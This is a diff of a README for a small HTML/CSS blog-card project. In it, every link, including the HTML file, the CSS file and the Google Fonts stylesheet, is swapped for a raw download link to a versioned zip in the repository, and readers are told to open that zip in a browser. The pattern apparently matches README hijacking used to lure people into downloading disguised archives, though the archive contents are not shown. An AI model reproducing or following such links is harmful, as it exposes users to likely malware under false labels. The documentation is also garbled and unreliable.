@@ -12,25 +12,25 @@ A simple and minimal blog card design using HTML and CSS. This project demonstra
 ```
 minimalBlogCard/
 |
-+-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip         # Main HTML file
-+-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip         # CSS file for styling
-\-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip          # Documentation (this file)
++-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip         # Main HTML file
++-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip         # CSS file for styling
+\-- https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip          # Documentation (this file)
 ```
 
 
 ## Usage
 
 1. Clone or download the repository to your local machine.
-2. Open the `https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip` file in your preferred browser to view the blog card design.
+2. Open the `https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip` file in your preferred browser to view the blog card design.
 3. Customize the content, styles, or images as needed for your project.
 
 ## Fonts
-This project uses the following fonts from [Google Fonts](https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip):
+This project uses the following fonts from [Google Fonts](https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip):
 - **Inter**: For general text and readability.
 - **Sora**: For titles and emphasis.
 
 To include these fonts in your project, the following `<link>` is used in the `<head>` section of the HTML:
-`<link href="https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/minimal_Card_Blog_2.8-alpha.3.zip,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Sora:wght@100..800&display=swap" rel="stylesheet"> `
+`<link href="https://github.com/ronny-gans/minimalBlogCard/raw/refs/heads/main/resources/Card_Blog_minimal_1.3.zip,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Sora:wght@100..800&display=swap" rel="stylesheet"> `
 
 ## Technologies Used
 * **HTML5:** Markup language for structuring the page.
